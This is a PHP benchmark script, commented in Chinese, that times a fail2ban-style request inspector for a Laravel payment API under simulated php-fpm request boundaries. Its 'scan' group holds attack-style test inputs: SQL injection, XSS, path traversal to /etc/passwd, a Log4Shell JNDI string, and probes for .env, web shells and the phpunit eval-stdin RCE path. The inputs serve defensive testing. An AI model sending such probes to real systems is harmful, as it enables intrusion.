<?php

/*
 * 规则检测的「每请求」基准：模拟 php-fpm 的请求边界。
 *
 * php-fpm 每个请求结束后，进程内的静态变量、容器与单例都会清空，只有 opcache（共享内存里的
 * 已编译脚本与不可变数组）和 PCRE 的正则缓存留下来。所以每次测量之前：
 *  - 把本包（Maximus\Fail2Ban\ 下所有已加载的类）的静态属性恢复成默认值；
 *  - 新建容器，用 Inspector::fromConfig() 从配置重新建规则入口（与服务提供者里的绑定相同）；
 *  - 新建请求对象（Symfony 的请求对象自己也缓存解析结果），并先取一次 getPathInfo()：
 *    收尾阶段在路由之后，路由匹配时已经解析过请求地址，检测时拿到的是解析好的。
 * 计时包含「建规则入口 + 检测」两段，分别记录。
 *
 * 测不到的：类的加载。php-fpm 每个请求都要重新声明用到的类（opcache 命中时很便宜），
 * 这里的类在第一次之后一直留在进程里。
 *
 * 用法（必须开 opcache，否则 require 编译产物每次都要重新编译，测出来的不是线上的情况；
 * 刚生成过编译产物时再加 -d opcache.file_update_protection=0，否则 2 秒内改过的文件不进 opcache）：
 *   php -d opcache.enable_cli=1 tests/Support/rules-benchmark.php [--samples=2000] [--customized]
 * --customized[=sensitive-path,known-exploit,scanner-agent]：宿主在 fail2ban.lists 里追加、排除了条目
 * （默认三份清单都改），改过的清单走运行时编译的路径。
 * 结果以 JSON 打印到标准输出。
 */

use Illuminate\Config\Repository;
use Illuminate\Container\Container;
use Illuminate\Http\Request;
use Maximus\Fail2Ban\Inspector;
use Maximus\Fail2Ban\Rules\Support\CompiledLists;
use Symfony\Component\HttpFoundation\Response;

require dirname(__DIR__, 2).'/vendor/autoload.php';

$options = getopt('', ['samples::', 'customized::']);
$samples = max(100, (int) ($options['samples'] ?? 2000));
$warmup = 100;

$config = require dirname(__DIR__, 2).'/config/fail2ban.php';

if (isset($options['customized'])) {
    $lists = [
        'sensitive-path' => ['extra' => ['/internal-backup/*'], 'except' => ['*.php']],
        'known-exploit' => ['extra' => ['/legacy/exploit*'], 'except' => []],
        'scanner-agent' => ['extra' => ['EvilCrawler'], 'except' => ['nmap']],
    ];

    $only = is_string($options['customized']) ? explode(',', $options['customized']) : array_keys($lists);
    $config['lists'] = array_intersect_key($lists, array_flip($only));
}

$actions = array_map(fn () => 'ban', $config['rules']);

/**
 * 本包所有已加载类的静态属性恢复成默认值（php-fpm 下一个请求看到的样子）。
 */
$reset = function (): void {
    foreach (get_declared_classes() as $class) {
        if (! str_starts_with($class, 'Maximus\\Fail2Ban\\') || str_starts_with($class, 'Maximus\\Fail2Ban\\Tests\\')) {
            continue;
        }

        foreach ((new ReflectionClass($class))->getProperties(ReflectionProperty::IS_STATIC) as $property) {
            if ($property->getDeclaringClass()->getName() === $class && $property->hasDefaultValue()) {
                $property->setValue(null, $property->getDefaultValue());
            }
        }
    }
};

$request = function (string $method, string $uri, string $agent): Request {
    $at = strpos($uri, '?');

    return new Request([], [], [], [], [], [
        'REQUEST_METHOD' => $method,
        'REQUEST_URI' => $uri,
        'QUERY_STRING' => $at === false ? '' : substr($uri, $at + 1),
        'HTTP_HOST' => 'api.example.com',
        'SERVER_NAME' => 'api.example.com',
        'SERVER_PORT' => 443,
        'HTTPS' => 'on',
        'SCRIPT_NAME' => '/index.php',
        'SCRIPT_FILENAME' => '/var/www/app/public/index.php',
        'REMOTE_ADDR' => '203.0.113.47',
        'HTTP_USER_AGENT' => $agent,
        'HTTP_REFERER' => 'https://merchant.example.com/deposit-orders',
    ]);
};

$agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.47',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'GuzzleHttp/7 curl/8.5.0 PHP/8.3.1',
    'okhttp/4.12.0',
    'python-requests/2.31.0',
    'Go-http-client/2.0',
];

// 四组请求：[方法, 地址, 状态码, 浏览器标识]
$groups = [
    // 正常请求：有浏览器标识，没有查询串，不是 404
    'normal' => [
        fn (int $i) => ['POST', '/v1/transactions/pay', 200],
        fn (int $i) => ['POST', '/v1/transactions/pay/query', 200],
        fn (int $i) => ['POST', '/v1/transactions/payout', 200],
        fn (int $i) => ['POST', '/v1/transactions/pay', 401],
        fn (int $i) => ['POST', '/v1/transactions/pay', 500],
        fn (int $i) => ['GET', '/v1/prepay/'.sha1((string) $i), 200],
        fn (int $i) => ['PUT', '/v1/prepay/'.sha1((string) $i), 200],
        fn (int $i) => ['DELETE', "/merchant/deposit-orders/$i", 200],
        fn (int $i) => ['GET', '/merchant/merchants/me', 200],
        fn (int $i) => ['POST', '/merchant/auth/login', 422],
        fn (int $i) => ['GET', '/', 200],
    ],
    // 带查询串的正常请求
    'normal_query' => [
        fn (int $i) => ['GET', '/v1/prepay/'.sha1((string) $i).'?locale=zh&t='.(1700000000 + $i), 200],
        fn (int $i) => ['GET', "/merchant/deposit-orders?page=$i&per_page=20&chain=TRON&token_id=1&status=1&start_date=2026-11-01&end_date=2026-11-07&merchant_order_no=7676745993567$i", 200],
        fn (int $i) => ['GET', '/merchant/deposit-orders?description=%E6%B5%8B%E8%AF%95%E8%AE%A2%E5%8D%95'.$i, 200],
        fn (int $i) => ['GET', "/portal/api/deposit-orders?keyword=TXYZ$i&range=custom&custom_range=2026-11-01+~+2026-11-07&page=2", 200],
        fn (int $i) => ['GET', "/v1/prepay/abc?notify_url=https%3A%2F%2Fshop$i.example.com%2Fnotify&return_url=https%3A%2F%2Fshop.example.com%2Fback%3Fid%3D$i", 200],
        fn (int $i) => ['GET', "/v1/prepay/abc?sign=osaULzwzws3Czoo%2B1KRXA5MSy1cv4wLTEdtFTCsFiJiqSG5L%2FK1BeQpsf$i%3D%3D&timestamp=1700000000&nonce=bb516e65-265e-4e5b-88c3-$i", 200],
    ],
    // 404：地址不存在，但不是敏感文件或利用地址（只命中 404 扫描）
    'not_found' => [
        fn (int $i) => ['GET', "/v1/prepay/$i/missing", 404],
        fn (int $i) => ['GET', "/merchant/deposit-orders/$i/detail", 404],
        fn (int $i) => ['GET', "/api/v2/orders/$i", 404],
        fn (int $i) => ['POST', "/v1/transactions/refund/$i", 404],
        fn (int $i) => ['GET', "/static/img/logo-$i.png", 404],
    ],
    // 扫描与攻击
    'scan' => [
        fn (int $i) => ['GET', '/.env', 404],
        fn (int $i) => ['GET', "/backup$i.sql.gz", 404],
        fn (int $i) => ['GET', "/wp-content/plugins/p$i/readme.txt", 404],
        fn (int $i) => ['GET', "/shell$i.php", 404],
        fn (int $i) => ['GET', '/_ignition/execute-solution', 404],
        fn (int $i) => ['GET', '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', 404],
        fn (int $i) => ['GET', "/random-$i", 404, 'sqlmap/1.7.2#stable (https://sqlmap.org)'],
        fn (int $i) => ['GET', "/merchant/deposit-orders?order_no=$i%27%20or%20%271%27%3D%271", 200],
        fn (int $i) => ['GET', "/x?q=%3Cscript%3Ealert($i)%3C%2Fscript%3E", 404],
        fn (int $i) => ['GET', "/x?file=..%2f..%2f..%2fetc%2fpasswd&n=$i", 404],
        fn (int $i) => ['GET', '/', 200, '${${lower:j}ndi:ldap://203.0.113.9/a'.$i.'}'],
    ],
];

$summary = function (array $times): array {
    sort($times);
    $count = count($times);

    return [
        'median' => round($times[intdiv($count, 2)], 2),
        'p95' => round($times[(int) floor($count * 0.95)], 2),
    ];
};

$results = [];

foreach ($groups as $name => $templates) {
    $build = [];
    $total = [];
    $hits = 0;

    for ($i = 0; $i < $warmup + $samples; $i++) {
        $template = $templates[$i % count($templates)]($i);
        [$method, $uri, $status] = $template;
        $agent = $template[3] ?? $agents[$i % count($agents)];

        $reset();
        Container::setInstance($container = new Container);
        $container->instance('config', new Repository(['fail2ban' => $config]));
        $req = $request($method, $uri, $agent);
        $req->getPathInfo();
        $response = new Response('', $status);

        $started = hrtime(true);
        $inspector = Inspector::fromConfig($config, $container);
        $built = hrtime(true);
        $found = $inspector->inspect($req, $response, $actions);
        $finished = hrtime(true);

        if ($i >= $warmup) {
            $build[] = ($built - $started) / 1e3;
            $total[] = ($finished - $started) / 1e3;
            $hits += count($found);
        }
    }

    $results[$name] = ['n' => $samples, 'hits' => $hits, 'build' => $summary($build), 'total' => $summary($total)];
}

echo json_encode([
    'opcache' => function_exists('opcache_get_status') && (opcache_get_status(false)['opcache_enabled'] ?? false),
    // 编译产物确实进了 opcache（改动后 2 秒内的文件 opcache 默认不缓存，见 opcache.file_update_protection）
    'compiled_cached' => class_exists(CompiledLists::class) && function_exists('opcache_is_script_cached') && opcache_is_script_cached(realpath(CompiledLists::FILE)),
    'customized' => isset($options['customized']) ? array_keys($config['lists']) : false,
    'groups' => $results,
], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE), "\n";
